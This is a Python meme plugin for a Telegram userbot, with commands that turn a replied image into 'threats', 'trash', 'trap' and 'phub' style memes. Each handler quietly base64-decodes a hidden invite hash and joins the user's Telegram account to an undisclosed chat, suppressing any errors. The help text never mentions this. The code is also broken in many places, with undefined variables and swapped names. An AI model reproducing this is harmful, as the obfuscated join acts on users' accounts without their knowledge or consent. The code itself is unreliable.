
#    Copyright (C) 2020  sandeep.n(π.$)
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.

import base64
import os

from telegraph import exceptions, upload_file
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import CMD_HELP
from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
from . import *


@bot.on(admin_cmd(pattern="threats$"))
async def bot(permemes):
    replied = await permemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    if replied.media:
        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
    else:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    try:
        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        per = Get(per)
        await catmemes.client(per)
    except BaseException:
        pass
    download_location = await permemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await permemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await permemmes.edit("generating image..")
    else:
        await permemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await permemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    per = f"https://telegra.ph{response[0]}"
    per = await threats(cat)
    await permemmes.delete()
    await permemes.client.send_file(permemes.chat_id, per, reply_to=replied)


@bot.on(admin_cmd(pattern="trash$"))
async def perbot(permemes):
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    if replied.media:
        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
    else:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    try:
        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        per = Get(per)
        await permemes.client(per)
    except BaseException:
        pass
    download_location = await permemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await permemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await permemmes.edit("generating image..")
    else:
        await permemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await permemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await trash(per)
    await permemmes.delete()
    await permemes.client.send_file(permemes.chat_id, per, reply_to=replied)


@bot.on(admin_cmd(pattern="trap$"))
async def perbot(permemes):
    input_str = permemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        text1, text2 = input_str.split("|")
    else:
        await edit_or_reply(
            permemes,
            "**Syntax :** reply to image or sticker with `.trap (name of the person to trap)|(trapper name)`",
        )
        return
    replied = await permemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    if replied.media:
        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
    else:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    try:
        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        per = Get(per)
        await permemes.client(per)
    except BaseException:
        pass
    download_location = await permemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await mempermes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await permemmes.edit("generating image..")
    else:
        await permemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await permemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    per = f"https://telegra.ph{response[0]}"
    per = await trap(text1, text2, per)
    await permemmes.delete()
    await permemes.client.send_file(permemes.chat_id, per, reply_to=replied)


@bot.on(admin_cmd(pattern="phub$"))
async def perbot(permemes):
    input_str = permemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        username, text = input_str.split("|")
    else:
        await edit_or_reply(
            permemes,
            "**Syntax :** reply to image or sticker with `.phub (username)|(text in comment)`",
        )
        return
    replied = await permemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    if replied.media:
        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
    else:
        await edit_or_reply(permemes, "reply to a supported media file")
        return
    try:
        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        per = Get(per)
        await catmemes.client(per)
    except BaseException:
        pass
    download_location = await permemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await permemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await permemmes.edit("generating image.wait sir.")
    else:
        await permemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    per = f"https://telegra.ph{response[0]}"
    per = await phcomment(per, text, username)
    await permemmes.delete()
    await permemes.client.send_file(catmemes.chat_id, per, reply_to=replied)


CMD_HELP.update(
    {
        "trolls": "**Plugin : **`trolls`\
      \n\n**Syntax :**`.threats` reply to image or sticker \
      \n**USAGE:**Changes the given pic to another pic which shows that pic content is threat to society as that of nuclear bomb .\
      \n\n**Syntax :**`.trash` reply to image or sticker\
      \n**USAGE : **Changes the given pic to another pic which shows that pic content is as equal as to trash(waste)\
      \n\n**Syntax :** reply to image or sticker with `.trap (name of the person to trap)|(trapper name)`\
      \n**USAGE :**Changes the given pic to another pic which shows that pic content is trapped in trap card\
      \n\n**Syntax :** reply to image or sticker with `.phub (username)|(text in comment)`\
      \n**USAGE :**Changes the given pic to another pic which shows that pic content as dp and shows a comment in phub with the given username\
      "
    }
)
